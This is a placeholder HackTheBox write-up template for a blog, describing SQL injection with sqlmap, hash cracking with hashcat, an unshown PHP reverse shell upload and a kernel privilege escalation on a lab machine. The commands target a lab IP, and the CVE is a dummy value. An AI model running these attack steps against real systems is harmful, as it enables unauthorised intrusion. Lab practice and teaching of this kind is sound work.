---
title: "HackTheBox: ExampleMachine Writeup"
date: 2023-06-15T10:00:00-05:00
draft: false
tags: ["htb", "linux", "sqli", "privesc"]
difficulty: "Medium"
---

This is a sample writeup to show you how posts work. Edit or delete this file.

<!--more-->

## Overview

ExampleMachine is a medium-difficulty Linux box from HackTheBox featuring SQL injection on a web application leading to initial access, followed by a kernel exploit for privilege escalation.

## Reconnaissance

### Nmap Scan

```bash
nmap -sC -sV -oA scans/example 10.10.10.100
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1
80/tcp open  http    Apache httpd 2.4.41
```

### Web Enumeration

Found a login form at `/admin/login.php`. Tested for SQL injection...

```bash
sqlmap -u "http://10.10.10.100/admin/login.php" --data="user=admin&pass=test" --dbs
```

## Exploitation

The login form was vulnerable to boolean-based blind SQLi. Extracted credentials from the database:

```
admin:$2y$10$abc123hashedpassword
```

Cracked the hash with hashcat:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Used the credentials to log in and found a file upload feature. Uploaded a PHP reverse shell...

## Post-Exploitation

```bash
whoami
# www-data
```

Found a kernel vulnerability (CVE-2021-XXXXX). Compiled and ran the exploit:

```bash
gcc exploit.c -o exploit
./exploit
whoami
# root
```

## Lessons Learned

- Always test login forms for SQL injection
- File upload features need proper validation
- Keep kernels updated to prevent local privilege escalation
